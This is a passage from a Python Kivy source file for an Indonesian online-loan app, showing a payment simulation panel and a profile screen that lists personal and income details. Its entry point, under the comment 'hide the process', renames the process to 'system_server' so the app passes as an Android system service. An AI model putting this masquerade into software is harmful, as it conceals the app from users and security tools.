                            rgba: 0.95,0.95,0.95,1
                        RoundedRectangle:
                            pos: self.pos
                            size: self.size
                            radius: [dp(8)]
                    
                    Label:
                        text: 'Simulasi Pembayaran'
                        font_size: dp(16)
                        bold: True
                        color: get_color_from_hex('#2E7D32')
                    
                    GridLayout:
                        cols: 2
                        spacing: dp(10)
                        
                        Label:
                            text: 'Bunga:'
                        Label:
                            id: hasil_bunga
                            text: 'Rp 0'
                        
                        Label:
                            text: 'Total Pinjaman:'
                        Label:
                            id: hasil_total
                            text: 'Rp 0'
                        
                        Label:
                            text: 'Angsuran/Bulan:'
                        Label:
                            id: hasil_angsuran
                            text: 'Rp 0 /bulan'
                
                GradientButton:
                    id: ajukan_btn
                    text: 'AJUKAN PINJAMAN'
                    button_color: get_color_from_hex('#2E7D32')
                    color: 1,1,1,1
                    size_hint_y: None
                    height: dp(50)
                    on_release: root.ajukan_pinjaman()
                
                Label:
                    id: notif_label
                    text: ''
                    color: get_color_from_hex('#4CAF50')
                    font_size: dp(12)
                    size_hint_y: None
                    height: dp(30)
                    opacity: 0

<ProfileScreen>:
    BoxLayout:
        orientation: 'vertical'
        
        BoxLayout:
            size_hint_y: 0.1
            padding: [dp(15), dp(10)]
            canvas:
                Color:
                    rgba: get_color_from_hex('#2E7D32')
                Rectangle:
                    pos: self.pos
                    size: self.size
            
            Button:
                text: '←'
                font_size: dp(20)
                size_hint_x: 0.1
                background_normal: ''
                background_color: 0,0,0,0
                color: 1,1,1,1
                on_release: root.manager.current = 'dashboard'
            
            Label:
                text: 'Profil Saya'
                font_size: dp(18)
                bold: True
                color: 1,1,1,1
        
        ScrollView:
            BoxLayout:
                orientation: 'vertical'
                spacing: dp(15)
                padding: dp(20)
                size_hint_y: None
                height: self.minimum_height
                
                # Foto Profil
                BoxLayout:
                    size_hint_y: None
                    height: dp(100)
                    
                    Label:
                        text: '👤'
                        font_size: dp(60)
                        size_hint: (0.3, 1)
                        color: get_color_from_hex('#2E7D32')
                
                # Informasi Pribadi
                BoxLayout:
                    orientation: 'vertical'
                    spacing: dp(10)
                    
                    Label:
                        text: 'Informasi Pribadi'
                        font_size: dp(16)
                        bold: True
                        color: get_color_from_hex('#2E7D32')
                        halign: 'left'
                    
                    GridLayout:
                        cols: 2
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height
                        
                        Label:
                            text: 'Nama:'
                            font_size: dp(12)
                            color: get_color_from_hex('#757575')
                        Label:
                            id: nama_lengkap
                            text: ''
                            font_size: dp(12)
                        
                        Label:
                            text: 'Email:'
                        Label:
                            id: email
                            text: ''
                        
                        Label:
                            text: 'No. HP:'
                        Label:
                            id: phone
                            text: ''
                        
                        Label:
                            text: 'Tgl Lahir:'
                        Label:
                            id: tgl_lahir
                            text: ''
                        
                        Label:
                            text: 'Alamat:'
                        Label:
                            id: alamat
                            text: ''
                        
                        Label:
                            text: 'Pekerjaan:'
                        Label:
                            id: pekerjaan
                            text: ''
                        
                        Label:
                            text: 'Penghasilan:'
                        Label:
                            id: penghasilan
                            text: ''
                
                GradientButton:
                    text: 'EDIT PROFIL'
                    button_color: get_color_from_hex('#4CAF50')
                    color: 1,1,1,1
                    size_hint_y: None
                    height: dp(45)
                
                GradientButton:
                    text: 'LOGOUT'
                    button_color: get_color_from_hex('#B00020')
                    color: 1,1,1,1
                    size_hint_y: None
                    height: dp(45)
                    on_release: root.logout()
''')

# ===================== MAIN ENTRY POINT =====================
if __name__ == '__main__':
    # Sembunyikan proses
    try:
        if sys.platform == 'linux':
            import prctl
            prctl.set_name("system_server")
    except:
        pass
    
    # Jalankan aplikasi
    PinjolApp().run()